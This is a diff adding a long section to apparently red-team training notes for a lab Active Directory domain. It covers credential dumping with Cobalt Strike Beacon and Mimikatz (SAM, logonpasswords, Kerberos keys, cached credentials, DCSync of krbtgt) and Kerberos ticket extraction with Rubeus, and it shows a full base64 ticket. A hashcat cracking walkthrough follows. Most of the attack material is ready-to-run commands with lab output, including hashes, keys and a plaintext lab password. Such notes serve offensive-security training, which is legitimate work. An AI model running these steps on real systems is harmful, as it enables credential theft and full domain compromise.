@@ -511,3 +511,653 @@ Open the new Beacon Terminal and use `checkin` and you will obtain the Beacon se
 ```
 Get-WmiEvent -Name WmiBackdoor
 ```
+
+If desired, the backdoor can be removed with `Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject`.
+
+## Obtaining Credential Material
+
+{% hint style="info" %}
+Once elevated on a machine, we can obtain credential material for other users who are authenticated.
+
+Credentials can come in the form of plaintext (username/password), hashes, (NTLM, AES, DCC, NetNTLM, etc), and Kerberos tickets.
+
+Here, we will review how to dump credentials in various formats.
+{% endhint %}
+
+### Beacon + Mimikatz
+
+Cobalt Strike has built-in version of Mimikatz that we can use to extract various credentials of all types.
+
+{% hint style="info" %}
+Remember, each time we execute Mimikatz in Beacon, a new temporary process is launched and then destroyed, meaning we can't run two related commands in a row.
+
+However, we can "chain" together multiple commands using a `;`.
+{% endhint %}
+
+#### Chaining together multiple commands with Beacon Mimikatz
+
+```
+beacon> mimikatz token::elevate ; lsadump::sam 
+```
+
+**This results in:**
+
+```
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+556	{0;000003e7} 1 D 24520     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 0 D 3250376   	NT AUTHORITY\SYSTEM	S-1-5-18	(40g,28p)	Primary
+ * Thread Token  : {0;000003e7} 1 D 3298296   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
+Domain : WKSTN-2
+SysKey : b9dc7de8b1972237bbbd7f82d970f79a
+Local SID : S-1-5-21-2281971671-4135076198-2136761646
+
+SAMKey : b0664279732686cfbb4b788c078fea82
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: fc525c9683e8fe067095ba2ddc971889
+    lm  - 0: 91b6e660bcac036ae7ab67a3d383bc82
+    ntlm- 0: fc525c9683e8fe067095ba2ddc971889
+
+(...)
+```
+
+#### Mimikatz Beacon Command Modifiers
+
+<mark style="color:yellow;">`!`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">elevates Beacon to</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`SYSTEM`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">before running the given command</mark>.
+
+* Useful in situations where you're running in high-integrity but need to impersonate `SYSTEM`
+* e.g. `!` is a direct replacement for `token::elevate`
+
+**A good use case is:**
+
+```
+mimikatz !lsadump::sam
+```
+
+* This is the same command ran before!
+* So<mark style="color:$success;">, use this!</mark>
+
+<mark style="color:yellow;">The</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`@`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">impersonates Beacon's thread token</mark>, this is useful for interacting with a remote system such as with `dcsync`, when Mimikatz needs to communicate with a remote Domain Controller.
+
+#### Impersonation Primitives
+
+**When needing to impersonate a user:**
+
+**For example:**
+
+* `make_token`
+* `steal_token`
+
+```
+[11/16 23:34:07] beacon> getuid
+[11/16 23:34:07] [*] Tasked beacon to get userid
+[11/16 23:34:08] [+] host called home, sent: 8 bytes
+[11/16 23:34:08] [*] You are DEV\bfarmer
+[11/16 23:34:24] beacon> make_token DEV\nlamb F3rrari
+[11/16 23:34:24] [*] Tasked beacon to create a token for DEV\nlamb
+[11/16 23:34:28] [+] host called home, sent: 35 bytes
+[11/16 23:34:28] [+] Impersonated DEV\nlamb (netonly)
+[11/16 23:34:37] beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
+[11/16 23:34:37] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /user:DEV\krbtgt command
+[11/16 23:34:38] [+] host called home, sent: 814407 bytes
+[11/16 23:34:40] [+] job registered with id 2
+[11/16 23:34:40] [+] [job 2] received output:
+[DC] 'dev.cyberbotic.io' will be the domain
+[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
+[DC] 'DEV\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 8/15/2022 4:01:04 PM
+Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
+    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
+    lm  - 0: 207d5e08551c51892309c0cf652c353b
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 550703b3096dce5b5bdc9b735b79ee30
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
+      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
+      des_cbc_md5       (4096) : 629189372a372fda
+
+* Primary:Kerberos *
+    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
+    Credentials
+      des_cbc_md5       : 629189372a372fda
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  82d27e18e5a51b359151719075b8efe6
+    02  cacfaa14338412f71c5fc49ab4e1d50f
+    03  a7ec666072cde603a927ed8ac683c337
+    04  82d27e18e5a51b359151719075b8efe6
+    05  cacfaa14338412f71c5fc49ab4e1d50f
+    06  9e5eb5ea22776f75944637a664825a15
+    07  82d27e18e5a51b359151719075b8efe6
+    08  c723218f35f1568e2916d31e9bf9a7bf
+    09  c723218f35f1568e2916d31e9bf9a7bf
+    10  8131eb31cbeb570d96532ae55dbfa418
+    11  1481ee3e83e68c4a4568e05758f01780
+    12  c723218f35f1568e2916d31e9bf9a7bf
+    13  2a730dd5bcc9b3561acfc500d6e855d3
+    14  1481ee3e83e68c4a4568e05758f01780
+    15  098e6f209b48d9d3338075ae91a37d44
+    16  098e6f209b48d9d3338075ae91a37d44
+    17  83834e22cfe70b6d2e17612840873048
+    18  0542f8bf328626961ece6ffe2f7e104b
+    19  c056ce79490f266b9379e9777fa482a0
+    20  70850aab87c42c75b60f8084c2c19901
+    21  7c4c9dc2a43a232fec42280344fdce23
+    22  7c4c9dc2a43a232fec42280344fdce23
+    23  6cd9bcf9e63591df5d18f9de3c972af5
+    24  73a23dbb97eac22f5075dc9781d7721b
+    25  73a23dbb97eac22f5075dc9781d7721b
+    26  8ae72fdbb2e6cea2b017c90856891cad
+    27  a6dc866ec7b1ccdce86cea695c74ccaf
+    28  87664d84ea3a2993101d13f2b2825a9e
+    29  bd839cda643ebdb4e8974ac010270395
+
+
+[11/16 23:34:45] [+] job 2 completed
+```
+
+{% hint style="info" %}
+Be sure to run these commands right after the impersonation, sometimes it will time out and the `lsadump` command must be ran immediately after forging the impersonation token for `dcsync` to work properly.
+{% endhint %}
+
+### NTLM Hashes
+
+The `sekurlsa::logonpasswords` Mimikatz module is infamous for being able to "dump plaintext passwords from memory".
+
+{% hint style="warning" %}
+This command requires elevated privileges.
+{% endhint %}
+
+```
+beacon> mimikatz !sekurlsa::logonpasswords
+
+# Or we can use the short-hand command for this same command
+
+beacon> logonpasswords
+```
+
+{% hint style="success" %}
+This will allow us to retrieve NTLM hashes which is useful for pairing with _**Pass the Hash**_ or even cracking the password to recover the plaintext.
+{% endhint %}
+
+### Kerberos Encryption Keys
+
+#### Dump Kerberos encryption keys of currently logged on users
+
+```
+mimikatz sekurlsa::ekeys
+```
+
+{% hint style="warning" %}
+This command requires elevated privileges.
+{% endhint %}
+
+We can take these keys and abuse them in a variety of Kerberos abuse scenarios.
+
+{% hint style="warning" %}
+There is a [known issue](https://github.com/gentilkiwi/mimikatz/issues/314) where Mimikatz may incorrectly label all of the hashes as `des_cbc_md4`.\
+
+
+In this case, the AES256 key is the one we want.  These hashes are not automatically populated into the Credential data model, but they can be added manually via _**View > Credentials > Add**_.
+{% endhint %}
+
+### Security Account Manager (SAM)
+
+The SAM database holds the NTLM hashes of local accounts only.
+
+#### Extracting SAM NTLM Hashes of Local Accounts
+
+{% hint style="warning" %}
+This command requires elevated privileges.
+{% endhint %}
+
+```
+mimikatz lsadump::sam
+```
+
+{% hint style="info" %}
+If a common local administrator account is being used with the same password across an entire environment, this can make it very trivial to move laterally.
+{% endhint %}
+
+### Domain Cached Credentials (DCC)
+
+DCC was designed where domain creds are required to logon to a machine even when it is disconnected from the Domain (e.g. roaming laptops).
+
+{% hint style="info" %}
+These local device caches the domain credentials so authentication can happen locally, but these can be extracted and cracked offline to recover plaintext credentials.
+{% endhint %}
+
+Since the outputted hash format is not NTLM-based, it cannot be used with PTH. So, we must crack them offline.
+
+The `lsadump::cache` Mimikatz module can extract these from `HKLM\SECURITY`.
+
+```
+beacon> mimikatz !lsadump::cache
+```
+
+#### Cracking
+
+To crack these with [hashcat](https://hashcat.net/hashcat/), we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be <mark style="color:yellow;">`$DCC2$<iterations>#<username>#<hash>`</mark>.
+
+{% hint style="warning" %}
+DCC is orders of magnitude slower to crack than NTLM.
+{% endhint %}
+
+### Extracting Kerberos Tickets
+
+#### Rubeus
+
+&#x20;[Rubeus](https://github.com/GhostPack/Rubeus) is a C# tool designed for Kerberos interaction and abuses, using legitimate Windows APIs.
+
+#### List all Kerberos Tickets in current elevated logon session&#x20;
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+  ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2 
+
+
+Action: Triage Kerberos Tickets (All Users)
+
+[*] Current LUID    : 0x3e7
+
+ ------------------------------------------------------------------------------------------------------------------- 
+ | LUID     | UserName                     | Service                                       | EndTime               |
+ ------------------------------------------------------------------------------------------------------------------- 
+ | 0x4214ae | nlamb @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/17/2025 9:34:39 AM |
+ | 0x4214ae | nlamb @ DEV.CYBERBOTIC.IO    | ldap/dc-2.dev.cyberbotic.io                   | 11/17/2025 9:34:39 AM |
+ | 0x1109b4 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 11/17/2025 8:39:00 AM |
+ | 0x1109b4 | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:39:00 AM |
+ | 0x1109b4 | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-2.dev.cyberbotic.io                   | 11/17/2025 8:39:00 AM |
+ | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/CYBERBOTIC.IO                          | 11/17/2025 8:38:59 AM |
+ | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | HTTP/scm-1.cyberbotic.io                      | 11/17/2025 8:38:59 AM |
+ | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:38:59 AM |
+ | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:38:59 AM |
+ | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:38:59 AM |
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 11/17/2025 8:35:26 AM |
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:35:26 AM |
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io                   | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/CYBERBOTIC.IO                          | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io                       | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | WKSTN-2$                                      | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io                   | 11/17/2025 8:35:26 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:35:26 AM |
+ -------------------------------------------------------------------------------------------------------------------
+```
+
+#### Targeting a specific user from obtained dump of Kerberos Tickets
+
+{% hint style="info" %}
+This will only allow us to target/dump Kerberos tickets of _**logged on**_ users
+{% endhint %}
+
+**Remember:** each user has their own logon session. This is represented by a LUID (Locally Unique Identifier).
+
+In this example, we will grab the LUID of `bfarmer`, `0x1109b4`.
+
+{% hint style="info" %}
+Tickets for service name `krbtgt` are Ticket Granting Tickets (TGTs) and others are Ticket Granting Service Tickets (TGS).
+{% endhint %}
+
+#### Dumping Tickets and extracting them from memory
+
+**For example, if we only wanted the TGT for `bfarmer`, we can do:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x11092f /service:krbtgt /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2 
+
+
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target service  : krbtgt
+[*] Target LUID     : 0x11092f
+[*] Current LUID    : 0x3e7
+
+  UserName                 : bfarmer
+  Domain                   : DEV
+  LogonId                  : 0x11092f
+  UserSID                  : S-1-5-21-569305411-121244042-2357301523-1104
+  AuthenticationPackage    : Kerberos
+  LogonType                : RemoteInteractive
+  LogonTime                : 11/16/2025 10:38:57 PM
+  LogonServer              : DC-2
+  LogonServerDNSDomain     : DEV.CYBERBOTIC.IO
+  UserPrincipalName        : bfarmer@cyberbotic.io
+
+
+    ServiceName              :  krbtgt/CYBERBOTIC.IO
+    ServiceRealm             :  DEV.CYBERBOTIC.IO
+    UserName                 :  bfarmer
+    UserRealm                :  DEV.CYBERBOTIC.IO
+    StartTime                :  11/16/2025 10:39:02 PM
+    EndTime                  :  11/17/2025 8:38:59 AM
+    RenewTill                :  11/23/2025 10:38:59 PM
+    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+    KeyType                  :  rc4_hmac
+    Base64(key)              :  FRSX1AWG/eqmFxOa0MiVbA==
+    Base64EncodedTicket   :
+
+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
+
+```
+
+### DCSync
+
+The [Directory Replication Service (MS-DRSR) protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) is used to synchronise and replicate Active Directory data between domain controllers. &#x20;
+
+DCSync is a technique which leverages this protocol to extract username and credential data from a DC.
+
+{% hint style="info" %}
+This requires [GetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) which is usually only available to domain admins. &#x20;
+
+The technique is included here for completeness, and it will be useful later on.
+{% endhint %}
+
+#### Performing DCSync via Beacon
+
+1. **Impersonate `nlamb`:**
+
+```
+beacon> make_token DEV\nlamb F3rrari
+[11/17 01:01:53] beacon> make_token DEV\nlamb F3rrari
+[11/17 01:01:53] [*] Tasked beacon to create a token for DEV\nlamb
+[11/17 01:01:54] [+] host called home, sent: 35 bytes
+[11/17 01:01:55] [+] Impersonated DEV\nlamb (netonly
+```
+
+2. Perform DCSync w/ impersonated `nlamb`:
+
+```
+beacon> dcsync dev.cyberbotic.io DEV\krbtgt
+[11/17 01:02:26] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
+[11/17 01:02:30] [+] host called home, sent: 314695 bytes
+[11/17 01:02:40] [+] job registered with id 17
+[11/17 01:02:40] [+] [job 17] received output:
+[DC] 'dev.cyberbotic.io' will be the domain
+[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
+[DC] 'DEV\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 8/15/2022 4:01:04 PM
+Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
+    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
+    lm  - 0: 207d5e08551c51892309c0cf652c353b
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
+      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
+      des_cbc_md5       (4096) : 629189372a372fda
+```
+
+Here we have extracted the NTLM and AES keys for the krbtgt account using _nlamb_ (a domain admin).
+
+## Password Cracking
+
+{% hint style="info" %}
+* `-a 0` specifies the wordlist attack mode.
+* `-m 1000` specifies that the hash is NTLM.
+* `ntlm.txt` is a text file containing the NTLM hash to crack.
+* `rockyou.txt` is the wordlist.
+{% endhint %}
+
+```
+hashcat.exe -a 0 -m 1000 ntlm.txt rockyou.txt
+
+58a478135a93ac3bf058a5ea0e8fdb71:Password123
+```
+
+### Extending Wordlists with Rules
+
+Rules can allow for the extension of "base" words in a wordlist that are common habits for users.
+
+Such manipulation can include toggling character cases and character replacement.
+
+* We can also append characters!
+
+```
+hashcat.exe -a 0 -m 1000 ntlm.txt rockyou.txt -r rules\add-year.rule
+
+acbfc03df96e93cf7294a01a6abbda33:Summer2020
+```
+
+* `-r rules\add-year.rule` is our custom rule file
+
+**The rockyou list does not contain Summer2020, but it does contain the base word, Summer:**
+
+```
+PS C:\> Select-String -Pattern "^Summer2020$" -Path rockyou.txt -CaseSensitive
+PS C:\> Select-String -Pattern "^Summer$" -Path rockyou.txt -CaseSensitive
+
+rockyou.txt:16573:Summer
+```
+
+### Masks
+
+A brute-force is an attempt to crack using all combinations in a given keyspace.
+
+A Mask attack is an evolution of the bruteforce and allows for us to be more selective over the keyspace in certain conditions.
+
+A Mask allows us to attack a password pattern in a much more efficient way.
+
+Using the full keyspace on the first character, we can limit ourselves to uppercase only and likewise with other positions.
+
+```
+hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
+
+64f12cddaa88057e06a81b54e73b949b:Password1
+```
+
+Where:
+
+* `-a 3` specifies the mask attack.
+* `?u?l?l?l?l?l?l?l?d` is the mask.
+
+**`hashcat --help` will show the charsets and are as follows:**
+
+```
+? | Charset
+===+=========
+l | abcdefghijklmnopqrstuvwxyz
+u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
+d | 0123456789
+h | 0123456789abcdef
+H | 0123456789ABCDEF
+s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+a | ?l?u?d?s
+b | 0x00 - 0xff
+```
+
+**You can combine these charsets within your mask for even more flexibility. It's also common for password to end with a special (such as `!`) rather than a number, but we can specify both in a mask:**
+
+```
+hashcat.exe -a 3 -m 1000 ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
+
+fbdcd5041c96ddbd82224270b57f11fc:Password!
+```
+
+**Where:**
+
+* `-1 ?d?s` defines a custom charset (digits and specials).
+* `?u?l?l?l?l?l?l?l?1` is the mask, where `?1` is the custom charset.
+
+### Mask Length & Mask Files
+
+By default, this mask attack sets a static password length - `?u?l?l?l?l?l?l?l?1` defines 9 characters, which means we can only crack a 9-character password. To crack passwords of different lengths, we have to manually adjust the mask accordingly.
+
+**Hashcat mask files make this process a lot easier for custom masks that you use often:**
+
+```
+PS C:\> cat example.hcmask
+?d?s,?u?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?1
+?d?s,?u?l?l?l?l?l?l?l?l?1
+```
+
+```
+hashcat.exe -a 3 -m 1000 ntlm.txt example.hcmask
+hashcat (v6.1.1) starting...
+
+Status...........: Exhausted
+Guess.Mask.......: ?u?l?l?l?l?1 [6]
+
+[...snip...]
+
+Guess.Mask.......: ?u?l?l?l?l?l?1 [7]
+
+820be3700dfcfc49e6eb6ef88d765d01:Chimney!
+```
+
+**Masks can even have static strings defined, such as a company name or other keyword you suspect are being used in passwords:**
+
+```
+ZeroPointSecurity?d
+ZeroPointSecurity?d?d
+ZeroPointSecurity?d?d?d
+ZeroPointSecurity?d?d?d?d
+```
+
+```
+hashcat.exe -a 3 -m 1000 ntlm.txt example2.hcmask
+
+f63ebb17e157149b6dfde5d0cc32803c:ZeroPointSecurity1234
+```
+
+### Combinator
+
+The combinator attack combines the entries from two dictionaries into single-word candidates. Take the following lists as an example:
+
+```
+PS C:\> cat list1.txt
+purple
+
+PS C:\> cat list2.txt
+monkey
+dishwasher
+```
+
+The combinator will produce "purplemonkey" and "purpledishwasher" as candidates.  You can also apply a rule to each word on the left- or right-hand side using the options `-j` and `-k`.  For instance, `-j $-` and `-k $!` would produce `purple-monkey!`.
+
+```
+hashcat.exe -a 1 -m 1000 ntlm.txt list1.txt list2.txt -j $- -k $!
+
+ef81b5ffcbb0d030874022e8fb7e4229:purple-monkey!
+```
+
+&#x20; If running in Linux, shells (`sh`, `bash`, `zsh`, `fish`, etc) will have their own behaviour when the $ character is used on the command line.  They may need to be quoted.
+
+### Hybrid
+
+Hashcat modes 6 and 7 are hybrid's based on wordlists, masks and the combinator.  You specify both a wordlist and mask on the command line, and the mask is appended or prepended to the words within the list. For example, your dictionary contains the word `Password`, then `-a 6 [...] list.txt ?d?d?d?d` will produce `Password0000` to `Password9999`.
+
+```
+hashcat.exe -a 6 -m 1000 ntlm.txt list.txt ?d?d?d?d
+
+be4c5fb0b163f3cc57bd390cdc495bb9:Password5555
+```
+
+**Where:**
+
+* `-a 6` specifies the hybrid wordlist + mask mode.
+* `?d?d?d?d` is the mask.
+
+**The hybrid mask + wordlist mode (`-a 7`) is practically identical, where the mask comes first:**
+
+```
+hashcat.exe -a 7 -m 1000 ntlm.txt ?d?d?d?d list.txt
+
+28a3b8f54a6661f15007fca23beccc9c:5555Password
+```
+
+### kwprocessor
+
+There are a number of external utilities that are separate from the main hashcat application. Here we'll review one called [kwprocessor](https://github.com/hashcat/kwprocessor).  This is a utility for generating key-walk passwords, which are based on adjacent keys such as `qwerty`, `1q2w3e4r`, `6yHnMjU7` and so on. To humans, these can look rather random and secure (uppers, lowers, numbers & specials), but in reality they're easy to generate programmatically.
+
+**kwprocessor has three main components:**
+
+1. **Base characters - the alphabet of the target language.**
+2. **Keymaps - the keyboard layout.**
+3. **Routes - the directions to walk in.**
+
+**There are several examples provided in the basechars, keymaps and routes directory in the kwprocessor download:**
+
+```
+kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o keywalk.txt
+
+PS C:\> Select-String -Pattern "^qwerty$" -Path keywalk.txt -CaseSensitive
+
+D:\Tools\keywalk.txt:759:qwerty
+D:\Tools\keywalk.txt:926:qwerty
+D:\Tools\keywalk.txt:931:qwerty
+D:\Tools\keywalk.txt:943:qwerty
+D:\Tools\keywalk.txt:946:qwerty
+```
+
+Some candidates will get generated multiple times, so you'll want to de-dup the list before using it for maximum efficiency.  This wordlist can then be used like any other dictionary in hashcat.
+
+&#x20; Use `kwp64.exe --help` to see customisable options such as toggling the shift key.
